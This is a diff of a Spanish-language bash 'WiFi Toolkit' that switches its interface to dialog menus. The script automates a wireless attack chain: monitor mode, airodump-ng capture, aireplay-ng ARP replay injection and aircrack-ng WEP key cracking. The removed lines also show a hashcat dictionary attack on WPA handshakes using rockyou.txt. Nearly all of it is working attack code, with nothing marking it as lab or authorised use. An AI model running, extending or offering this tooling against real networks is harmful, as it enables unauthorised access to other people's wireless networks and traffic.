@@ -1,10 +1,10 @@
 #!/bin/bash
 
 # ==========================================================
-# WiFi Toolkit - Soporte para WPA, WPA2, WPA3, WEP y abiertas
+# WiFi Toolkit - Soporte WPA, WPA2, WPA3, WEP y Redes Abiertas
 # ==========================================================
 
-# Colores para mensajes
+# Configuración de colores para mensajes
 GREEN='\033[0;32m'
 RED='\033[0;31m'
 YELLOW='\033[0;33m'
@@ -22,10 +22,19 @@ DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog" "airep
 # Funciones
 # ==========================================================
 
+# Mostrar barra de progreso
+show_progress() {
+    dialog --title "Progreso" --gauge "$1" 10 50 0
+    for i in $(seq 1 100); do
+        echo $i
+        sleep 0.02
+    done | dialog --title "Progreso" --gauge "$1" 10 50 0
+}
+
 # Verificar permisos de administrador
 check_permissions() {
     if [[ $EUID -ne 0 ]]; then
-        echo -e "${RED}Este script debe ejecutarse como administrador. Usa 'sudo'.${NC}"
+        dialog --title "Error" --msgbox "Este script debe ejecutarse como administrador. Usa 'sudo'." 8 40
         exit 1
     fi
 }
@@ -34,31 +43,31 @@ check_permissions() {
 prepare_project_directory() {
     for dir in "$PROJECT_DIR" "$RESULTS_DIR"; do
         if [[ ! -d "$dir" ]]; then
-            mkdir -p "$dir" || { echo -e "${RED}Error al crear la carpeta $dir.${NC}"; exit 1; }
+            mkdir -p "$dir" || { dialog --title "Error" --msgbox "Error al crear la carpeta $dir." 8 40; exit 1; }
         fi
     done
 }
 
 # Verificar e instalar dependencias
 install_dependencies() {
-    echo -e "${BLUE}Verificando dependencias...${NC}"
+    dialog --title "Instalación de dependencias" --infobox "Verificando dependencias..." 8 40
     for dep in "${DEPENDENCIES[@]}"; do
         if ! command -v $dep &>/dev/null; then
-            echo -e "${YELLOW}Instalando $dep...${NC}"
+            dialog --title "Instalación de dependencias" --infobox "Instalando $dep..." 8 40
             apt-get install -y $dep &>/dev/null || {
-                echo -e "${RED}Error al instalar $dep.${NC}"
+                dialog --title "Error" --msgbox "Error al instalar $dep." 8 40
                 exit 1
             }
         fi
     done
-    echo -e "${GREEN}Todas las dependencias están instaladas.${NC}"
+    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
 }
 
 # Detectar interfaz inalámbrica
 detect_wireless_interface() {
     interface=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
     if [[ -z "$interface" ]]; then
-        echo -e "${RED}No se encontró ninguna interfaz inalámbrica.${NC}"
+        dialog --title "Error" --msgbox "No se encontró ninguna interfaz inalámbrica." 8 40
         exit 1
     fi
     echo "$interface"
@@ -67,99 +76,74 @@ detect_wireless_interface() {
 # Activar modo monitor
 enable_monitor_mode() {
     interface=$(detect_wireless_interface)
-    echo -e "${BLUE}Activando modo monitor en $interface...${NC}"
+    dialog --title "Modo Monitor" --infobox "Activando modo monitor en $interface..." 8 40
     airmon-ng start $interface &>/dev/null || iw dev $interface set type monitor &>/dev/null
-    echo -e "${GREEN}Modo monitor activado en $interface.${NC}"
+    dialog --title "Modo Monitor" --msgbox "Modo monitor activado en $interface." 8 40
 }
 
 # Escanear redes
 scan_networks() {
     interface=$(detect_wireless_interface)
-    echo -e "${BLUE}Escaneando redes durante 60 segundos...${NC}"
+    dialog --title "Escaneo de Redes" --infobox "Escaneando redes durante 60 segundos..." 8 40
     xterm -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/scan_results" &
-    sleep 60
+    show_progress "Escaneando redes inalámbricas"
     killall airodump-ng
-    echo -e "${GREEN}Escaneo completado. Resultados guardados en $RESULTS_DIR.${NC}"
-}
-
-# Analizar redes escaneadas
-analyze_networks() {
-    cap_file=$(find $RESULTS_DIR -type f -name "*.cap" | head -n 1)
-    if [[ -z "$cap_file" ]]; then
-        echo -e "${RED}No se encontró ningún archivo .cap.${NC}"
-        return
-    fi
-
-    networks=$(aircrack-ng $cap_file | grep -E "WEP|WPA|Open" | awk '{print $3, $4, $5}')
-    if [[ -z "$networks" ]]; then
-        echo -e "${YELLOW}No se encontraron redes vulnerables.${NC}"
-        return
-    fi
-
-    echo -e "${BLUE}Redes encontradas:${NC}"
-    echo "$networks" | nl
+    dialog --title "Escaneo de Redes" --msgbox "Escaneo completado. Resultados guardados en $RESULTS_DIR." 8 40
 }
 
 # Ataque a redes WEP
 attack_wep() {
-    echo -e "${BLUE}Iniciando ataque WEP...${NC}"
+    dialog --title "Ataque WEP" --infobox "Preparando ataque WEP..." 8 40
+    show_progress "Preparando ataque WEP"
+    
     interface=$(detect_wireless_interface)
     cap_file=$(find $RESULTS_DIR -type f -name "*.cap" | head -n 1)
-
+    
     if [[ -z "$cap_file" ]]; then
-        echo -e "${RED}No se encontró ningún archivo .cap.${NC}"
+        dialog --title "Error" --msgbox "No se encontró ningún archivo .cap para atacar." 8 40
         return
     fi
 
-    aireplay-ng --arpreplay -b $BSSID $interface &>/dev/null
-    aircrack-ng -z $cap_file
-    echo -e "${GREEN}Ataque WEP completado.${NC}"
+    dialog --title "Ataque WEP" --msgbox "Iniciando ataque de reinyección ARP en la red WEP..." 8 40
+    xterm -hold -e "aireplay-ng --arpreplay -b <BSSID> $interface" &
+    sleep 10
+
+    dialog --title "Ataque WEP" --msgbox "Intentando descifrar clave WEP..." 8 40
+    aircrack-ng -z $cap_file > $RESULTS_DIR/wep_results.txt
+
+    if grep -q "KEY FOUND" $RESULTS_DIR/wep_results.txt; then
+        dialog --title "Clave WEP Encontrada" --msgbox "La clave WEP ha sido descifrada. Revisa el archivo $RESULTS_DIR/wep_results.txt." 8 40
+    else
+        dialog --title "Error" --msgbox "No se pudo descifrar la clave WEP." 8 40
+    fi
 }
 
-# Ataque a redes abiertas
+# Gestión de redes abiertas
 attack_open() {
-    echo -e "${YELLOW}Las redes abiertas no requieren descifrado.${NC}"
-    echo -e "${GREEN}Puedes conectarte directamente desde tu gestor de redes.${NC}"
-}
-
-# Ataque WPA/WPA2/WPA3
-attack_wpa() {
-    cap_file=$(find $RESULTS_DIR -type f -name "*.cap" | head -n 1)
-    dictionary=$(find / -type f -name "rockyou.txt" | head -n 1)
-
-    if [[ -z "$cap_file" || -z "$dictionary" ]]; then
-        echo -e "${RED}Faltan archivos necesarios para el ataque.${NC}"
-        return
-    fi
-
-    echo -e "${BLUE}Iniciando ataque WPA/WPA2/WPA3...${NC}"
-    hashcat -m 22000 $cap_file $dictionary
+    dialog --title "Redes Abiertas" --msgbox "Las redes abiertas no requieren descifrado. Puedes conectarte directamente desde tu gestor de redes." 8 40
 }
 
 # Menú principal
 main_menu() {
     while true; do
-        echo -e "\n${BLUE}WiFi Toolkit - Menú principal${NC}"
-        echo "1. Instalar dependencias"
-        echo "2. Activar modo monitor"
-        echo "3. Escanear redes"
-        echo "4. Analizar redes"
-        echo "5. Atacar redes WEP"
-        echo "6. Atacar redes WPA/WPA2/WPA3"
-        echo "7. Gestionar redes abiertas"
-        echo "8. Salir"
-        read -p "Selecciona una opción: " option
+        choice=$(dialog --clear --backtitle "WiFi Toolkit" \
+            --title "Menú Principal" \
+            --menu "Selecciona una opción:" 15 50 6 \
+            1 "Instalar dependencias" \
+            2 "Habilitar modo monitor" \
+            3 "Escanear redes" \
+            4 "Atacar redes WEP" \
+            5 "Gestionar redes abiertas" \
+            6 "Salir" 3>&1 1>&2 2>&3)
 
-        case $option in
+        case $choice in
             1) install_dependencies ;;
             2) enable_monitor_mode ;;
             3) scan_networks ;;
-            4) analyze_networks ;;
-            5) attack_wep ;;
-            6) attack_wpa ;;
-            7) attack_open ;;
-            8) echo -e "${GREEN}Saliendo...${NC}"; exit 0 ;;
-            *) echo -e "${RED}Opción inválida.${NC}" ;;
+            4) attack_wep ;;
+            5) attack_open ;;
+            6) clear; exit 0 ;;
+            *) dialog --title "Error" --msgbox "Opción inválida. Inténtalo de nuevo." 8 40 ;;
         esac
     done
 }
